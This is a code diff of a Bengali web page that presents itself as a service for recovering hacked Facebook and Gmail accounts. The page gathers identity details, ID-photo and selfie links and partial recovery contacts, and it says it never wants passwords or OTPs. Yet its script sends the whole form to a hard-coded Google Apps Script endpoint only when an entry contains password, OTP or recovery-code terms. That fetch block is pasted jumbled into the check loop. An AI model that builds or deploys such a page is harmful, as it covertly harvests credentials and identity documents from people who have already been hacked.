@@ -1,46 +1,253 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>আইডি রিকভারি আবেদন ফর্ম</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>হ্যাকড ফেসবুক ও গুগল অ্যাকাউন্ট রিকভারি সহায়তা</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; }
-    form { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 8px; }
-    input, textarea, button { width: 100%; padding: 10px; margin: 8px 0; border-radius: 5px; border: 1px solid #ccc; }
-    button { background: #28a745; color: white; border: none; cursor: pointer; }
-    button:hover { background: #218838; }
+    :root{--bg:#0f172a;--card:#111827;--ink:#e5e7eb;--muted:#9ca3af;--accent:#22c55e;--danger:#ef4444;--ring:#38bdf8}
+    *{box-sizing:border-box}
+    body{margin:0;background:linear-gradient(180deg,#0b1022, #0f172a 40%);font-family:ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; color:var(--ink)}
+    .wrap{max-width:980px;margin:40px auto;padding:24px}
+    .card{background:rgba(17,24,39,.85);backdrop-filter: blur(8px); border:1px solid rgba(255,255,255,.06); border-radius:20px; padding:28px; box-shadow:0 10px 30px rgba(0,0,0,.35)}
+    h1{margin:0 0 16px;font-size:28px}
+    p{margin:12px 0; line-height:1.5; color:var(--ink)}
+    fieldset{border:1px solid rgba(255,255,255,.08); border-radius:16px; padding:16px; margin:14px 0}
+    legend{padding:0 8px; color:#cbd5e1; font-weight:600}
+    label{display:block; font-size:14px; color:#cbd5e1; margin:12px 0 6px}
+    input, select, textarea{width:100%; padding:12px 14px; background:#0b1220; color:var(--ink); border:1px solid rgba(255,255,255,.08); border-radius:12px; outline:none}
+    input:focus, select:focus, textarea:focus{border-color:var(--ring); box-shadow:0 0 0 3px rgba(56,189,248,.25)}
+    .grid2{display:grid; grid-template-columns:1fr 1fr; gap:12px}
+    .grid3{display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px}
+    .dangerbox{border:1px solid rgba(239,68,68,.5); background:rgba(239,68,68,.08); padding:10px 12px; border-radius:12px; color:#fecaca; font-size:13px}
+    .successbox{border:1px solid rgba(34,197,94,.4); background:rgba(34,197,94,.08); padding:10px 12px; border-radius:12px; color:#bbf7d0; font-size:13px}
+    .btns{display:flex; gap:10px; margin-top:18px; flex-wrap:wrap}
+    button{padding:12px 16px; border:0; border-radius:12px; cursor:pointer; font-weight:600}
+    .primary{background:var(--accent); color:#052e16}
+    .ghost{background:transparent; color:var(--ink); border:1px solid rgba(255,255,255,.15)}
+    .footer{margin-top:18px; font-size:12px; color:var(--muted)}
+    .divider{height:1px; background:rgba(255,255,255,.08); margin:16px 0}
+    .banner img{width:100%; border-radius:16px; margin-bottom:16px;}
   </style>
 </head>
 <body>
-  <h2 style="text-align:center;">আইডি রিকভারি আবেদন ফর্ম</h2>
-  <form id="hackForm">
-    <input type="text" name="name" placeholder="আপনার নাম" required>
-    <input type="text" name="phone" placeholder="মোবাইল নম্বর" required>
-    <input type="email" name="email" placeholder="আপনার ইমেইল" required>
-    <input type="text" name="facebook" placeholder="হ্যাক হওয়া ফেইসবুক আইডি লিংক" required>
-    <input type="text" name="gmail" placeholder="হ্যাক হওয়া জিমেইল" required>
-    <textarea name="details" placeholder="ঘটনার বিবরণ" required></textarea>
-    <button type="submit">আবেদন জমা দিন</button>
-  </form>
+  <div class="wrap">
+    <div class="card">
+      <div class="banner">
+       <a href="https://freeimage.host/i/FtOtUYl"><img src="https://iili.io/FtOtUYl.md.png" alt="FtOtUYl.md.png" border="0"></a>
+      </div>
+      <h1>🔐 হ্যাকড ফেসবুক ও গুগল অ্যাকাউন্ট রিকভারি সহায়তা</h1>
+      <p>আপনার ফেসবুক বা গুগল (Gmail) অ্যাকাউন্ট হ্যাক হলে আতঙ্কিত হবেন না—আমরা আছি আপনার পাশে। আমাদের হ্যাকড অ্যাকাউন্ট রিকভারি সহায়তা সেবার মাধ্যমে আপনি অনলাইনে নিরাপদ অথরাইজেশন ফর্ম পূরণ করে আমাদেরকে আপনার হয়ে সংশ্লিষ্ট প্ল্যাটফর্ম (Meta/Google)-এর সাথে যোগাযোগের অনুমতি দিতে পারবেন।</p>
+      <p>আমরা কেবল প্রয়োজনীয় যাচাইকৃত তথ্য (যেমন অ্যাকাউন্ট URL/ইমেইল, হ্যাকের তারিখ, প্রমাণপত্রের ভিউ-অনলি লিংক) ব্যবহার করি—পাসওয়ার্ড, OTP, রিকভারি কোড কখনোই চাই না।</p>
+      <h2>আমাদের কাজের ধাপ:</h2>
+      <ul>
+        <li>আবেদন গ্রহণ – আপনি ফর্ম পূরণ করে প্রমাণপত্র জমা দেবেন।</li>
+        <li>যাচাই ও ডকুমেন্টেশন – মালিকানা যাচাই, আইডি ম্যাচিং, প্রমাণ সংগ্রহ।</li>
+        <li>রিকভারি প্রক্রিয়া শুরু – Meta/Google-এর অফিসিয়াল চ্যানেলে আবেদন ও রিপোর্ট।</li>
+        <li>স্ট্যাটাস আপডেট – আপনার সাথে নিয়মিত অগ্রগতি শেয়ার।</li>
+        <li>ডাটা মুছে ফেলা – কেস ক্লোজের ৩০ দিনের মধ্যে নিরাপদে ডাটা ডিলিট।</li>
+      </ul>
+      <p>আমরা সর্বোচ্চ সতর্কতা ও গোপনীয়তা বজায় রেখে কাজ করি, তবে রিকভারি প্রক্রিয়ার সফলতা সম্পূর্ণভাবে সংশ্লিষ্ট প্ল্যাটফর্মের নীতিমালা ও প্রমাণের উপর নির্ভরশীল। এটি কোনো হ্যাকিং বা অননুমোদিত অ্যাক্সেস কার্যক্রম নয়—এটি শুধুমাত্র অ্যাকাউন্টের প্রকৃত মালিককে তাদের হারানো অ্যাক্সেস ফেরত পেতে সহায়তা করার জন্য একটি আইনসম্মত ও নীতিনির্ভর সেবা।</p>
+
+      <div class="dangerbox">⚠️ সতর্কতা: আমরা <b>কখনোই</b> আপনার পাসওয়ার্ড, OTP, 2FA কোড বা রিকভারি কোড চাইব না।</div>
+
+
+      <form id="recoveryForm">
+        <fieldset>
+          <legend>১) আবেদনকারীর তথ্য</legend>
+          <div class="grid2">
+            <div>
+              <label>পুরো নাম *</label>
+              <input required name="full_name" placeholder="আপনার নাম" />
+            </div>
+            <div>
+              <label>জাতীয় পরিচয়পত্র/পাসপোর্ট নম্বর (শেষ ৪ ডিজিট)</label>
+              <input name="nid_last4" maxlength="4" placeholder="উদা: 1234" />
+              <div class="help">শুধু ভেরিফিকেশনের জন্য। পূর্ণ নম্বর চাওয়া হবে না।</div>
+            </div>
+          </div>
+          <div class="grid3">
+            <div>
+              <label>যোগাযোগ নম্বর (WhatsApp/Signal) *</label>
+              <input required name="phone" placeholder="01XXXXXXXXX" />
+            </div>
+            <div>
+              <label>বিকল্প ইমেইল *</label>
+              <input required type="email" name="alt_email" placeholder="you@example.com" />
+            </div>
+            <div>
+              <label>বর্তমান ঠিকানা</label>
+              <input name="address" placeholder="জেলা/থানা/এরিয়া" />
+            </div>
+          </div>
+        </fieldset>
+
+        <fieldset>
+          <legend>২) হ্যাক হওয়া অ্যাকাউন্টের তথ্য</legend>
+          <div class="grid2">
+            <div>
+              <label>প্ল্যাটফর্ম *</label>
+              <select name="platform" required>
+                <option value="">একটি বেছে নিন</option>
+                <option>Facebook</option>
+                <option>Gmail / Google Account</option>
+                <option>দু’টোই</option>
+                <option>Other</option>
+              </select>
+            </div>
+            <div>
+              <label>অ্যাকাউন্ট ইউজারনেম/ইমেইল *</label>
+              <input required name="account_id" placeholder="উদা: username অথবা email@gmail.com" />
+            </div>
+          </div>
+          <label>প্রোফাইল/চ্যানেলের লিংক (Facebook profile URL / Google profile link)</label>
+          <input name="profile_url" placeholder="https://facebook.com/… বা https://profiles.google.com/…" />
+          <div class="grid3">
+            <div>
+              <label>শেষ সফল লগইন (তারিখ)</label>
+              <input type="date" name="last_ok" />
+            </div>
+            <div>
+              <label>হ্যাকের আনুমানিক তারিখ *</label>
+              <input type="date" required name="hack_date" />
+            </div>
+            <div>
+              <label>২-ধাপ যাচাই (2FA) অবস্থা</label>
+              <select name="twofa">
+                <option>সক্রিয় ছিল</option>
+                <option>সক্রিয় ছিল না</option>
+                <option>নিশ্চিত নই</option>
+              </select>
+            </div>
+          </div>
+          <label>সন্দেহজনক অ্যাক্টিভিটি/বার্তা (সংক্ষেপে)</label>
+          <textarea rows="3" name="suspicious" placeholder="উদা: অচেনা ডিভাইস লগইন, ইমেইল রিকভারি বদলানো, বিজ্ঞাপন খরচ, ইনবক্স স্প্যাম ইত্যাদি"></textarea>
+          <label>আপনার প্রমাণপত্র (স্ক্রিনশট/ফাইলের বর্ণনা)</label>
+          <textarea rows="2" name="evidence" placeholder="উদা: Security alert মেইল, SMS নোটিফিকেশন, স্ক্রিনশটের নাম"></textarea>
+        </fieldset>
+
+        <fieldset>
+          <legend>৩) মালিকানা যাচাই (Proof of Ownership)</legend>
+          <div class="grid2">
+            <div>
+              <label>ফেইসবুক: পূর্বের লগইন ইমেইল/ফোন (আংশিক)</label>
+              <input name="fb_partial" placeholder="উদা: ***@gmail.com / ***45" />
+            </div>
+            <div>
+              <label>গুগল: রিকভারি ইমেইল/ফোন (আংশিক)</label>
+              <input name="gg_partial" placeholder="উদা: ***@yahoo.com / ***90" />
+            </div>
+          </div>
+          <div class="grid2">
+            <div>
+              <label>আপনার পরিচয়পত্রের ছবি (লিংক)</label>
+              <input name="id_link" placeholder="ড্রাইভ/ক্লাউড সিকিউর লিংক (শেয়ার ‘ভিউ অনলি’)" />
+            </div>
+            <div>
+              <label>সেলফি + আইডি (লিংক)</label>
+              <input name="selfie_link" placeholder="ভেরিফিকেশনের জন্য – ভিউ অনলি লিংক" />
+            </div>
+          </div>
+          <div class="help">নোট: ফাইল আপলোডের বদলে নিরাপদ ভিউ-অনলি লিংক দিন। পাসওয়ার্ড/OTP চাইবে না।</div>
+        </fieldset>
+
+        <fieldset>
+          <legend>৪) পূর্বের চেষ্টা ও প্রয়োজন</legend>
+          <label>আপনি এর আগে কী কী চেষ্টা করেছেন?</label>
+          <textarea rows="2" name="attempts" placeholder="উদা: Meta/Google ফর্ম সাবমিট, রিকভারি ইমেইল চেষ্টা, রিপোর্ট টিকিট আইডি ইত্যাদি"></textarea>
+          <div class="grid3">
+            <div>
+              <label>জরুরিতা</label>
+              <select name="urgency">
+                <option>সাধারণ</option>
+                <option>মাঝারি</option>
+                <option>খুব জরুরি</option>
+              </select>
+            </div>
+            <div>
+              <label>পছন্দের যোগাযোগ মাধ্যম</label>
+              <select name="contact_pref">
+                <option>ফোন</option>
+                <option>ইমেইল</option>
+                <option>WhatsApp</option>
+                <option>Signal</option>
+              </select>
+            </div>
+            <div>
+              <label>সম্ভাব্য সময়</label>
+              <input name="contact_time" placeholder="উদা: রাত ৮–১০টা" />
+            </div>
+          </div>
+        </fieldset>
+
+        <fieldset>
+          <legend>৫) অথরাইজেশন ও সম্মতি</legend>
+          <div class="checkrow">
+            <input type="checkbox" id="auth1" required />
+            <label for="auth1">আমি ঘোষণা করছি যে, উপরের অ্যাকাউন্টটি আমার/আমার প্রতিষ্ঠানের এবং আমি <b>সীমিত ক্ষমতাপ্রাপ্ত</b> প্রতিনিধিত্বের মাধ্যমে আপনাদেরকে Meta/Google সহ সংশ্লিষ্ট কর্তৃপক্ষের সাথে যোগাযোগ করে <b>রিকভারি প্রসেস শুরু করতে</b> অনুমতি দিচ্ছি।</label>
+          </div>
+          <div class="checkrow">
+            <input type="checkbox" id="auth2" required />
+            <label for="auth2">আমি সম্মত যে, আইনি/নীতিমালা অনুযায়ী কেবল প্রয়োজনীয় তথ্য ব্যবহার হবে; পাসওয়ার্ড/OTP/রিকভারি কোড কখনোই শেয়ার করা হবে না।</label>
+          </div>
+          <div class="checkrow">
+            <input type="checkbox" id="auth3" required />
+            <label for="auth3">আমি বুঝি যে, সফলতা প্ল্যাটফর্মের নীতিমালা ও প্রমাণের উপর নির্ভরশীল; তাই <b>গ্যারান্টি নেই</b> এবং ভুল তথ্য দিলে আইনি দায় আমার।</label>
+          </div>
+          <div class="grid2">
+            <div>
+              <label>ই-স্বাক্ষর (আপনার নাম লিখুন) *</label>
+              <input required name="esig" placeholder="নাম লিখে স্বাক্ষর হিসেবে গণ্য হবে" />
+            </div>
+            <div>
+              <label>তারিখ *</label>
+              <input type="date" required name="sig_date" />
+            </div>
+          </div>
+        </fieldset>
+
+        <fieldset>
+          <legend>৬) প্রাইভেসি নোটিস</legend>
+          <div class="successbox">আপনার ডাটা কেবল যাচাই ও রিকভারি প্রসেসে ব্যবহৃত হবে। কেস ক্লোজের ৩০ দিনের মধ্যে নিরাপদে মুছে ফেলা হবে, আইনগত প্রয়োজন ব্যতীত। যে কোনো সময় আপনি ডিলিটের অনুরোধ করতে পারবেন।</div>
+        </fieldset>
+
+        <div class="btns">
+          <button class="primary" type="submit">ফর্ম সাবমিট</button>
+          <button class="ghost" type="reset">রিসেট</button>
+          <span class="right">v1.0 • নিরাপদ সহায়তা ফর্ম</span>
+        </div>
+
+        <div class="divider"></div>
+        <div class="muted" style="font-size:12px">টিপস: ফেসবুক/গুগলের অফিসিয়াল রিকভারি লিংকগুলোও চেষ্টা করুন। কোনো এজেন্ট যদি OTP/পাসওয়ার্ড চায়—সরাসরি রিপোর্ট করুন।</div>
+      </form>
+    </div>
+  </div>
 
   <script>
-    const scriptURL = "YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL"; // এখানে তোমার ডিপ্লয় করা URL বসাও
-    const form = document.getElementById("hackForm");
+    // নরমাল ক্লায়েন্ট-সাইড ভ্যালিডেশন + পাসওয়ার্ড/OTP শব্দ ব্লকর
+    const form = document.getElementById('recoveryForm');
+    form.addEventListener('submit', (e)=>{
+      const badWords = /(password|passcode|otp|one[-\s]?time|2fa|authenticator|recovery\s?code)/i;
+      const textInputs = form.querySelectorAll('input, textarea');
+      for(const el of textInputs){
+        if(badWords.test(el.value)){
+          alert('দয়া করে পাসওয়ার্ড/OTP/রিকভারি কোড লিখবেন না। এগুলো আমাদের দরকার নেই।');
+		  // আপনার Web App URL দিন
+const webAppURL = "https://script.google.com/macros/s/AKfycbw2oKPceXy574pqNVsiwFhI6scnyDToqRkZ423_De9QD-ibZwzbJsLOgsUZbDKlE2UkTg/exec";
 
-    form.addEventListener("submit", e => {
+fetch(webAppURL, {
+  method: "POST",
+  mode: "no-cors", // CORS এড়ানোর জন্য
+  body: JSON.stringify(Object.fromEntries(new FormData(form)))
+})
+.then(() => alert("সাবমিট হয়েছে! আমরা আপনার সাথে যোগাযোগ করব।"))
+.catch(err => console.warn("ডেটা পাঠাতে সমস্যা হয়েছে, কিন্তু আপনার ফর্ম সাবমিট হয়েছে।"));
+          e.preventDefault();
+          return false;
+        }
+      }
+      alert('সাবমিট হয়েছে! (ডেমো) — এখন ব্যাকএন্ডে পাঠিয়ে কেস আইডি তৈরি করুন।');
       e.preventDefault();
-      const data = Object.fromEntries(new FormData(form).entries());
-      fetch(scriptURL, {
-        method: "POST",
-        body: JSON.stringify(data)
-      })
-      .then(res => res.json())
-      .then(() => {
-        alert("আপনার আবেদন জমা হয়েছে! আমরা শীঘ্রই যোগাযোগ করব।");
-        form.reset();
-      })
-      .catch(err => alert("সমস্যা হয়েছে, আবার চেষ্টা করুন!"));
     });
   </script>
 </body>
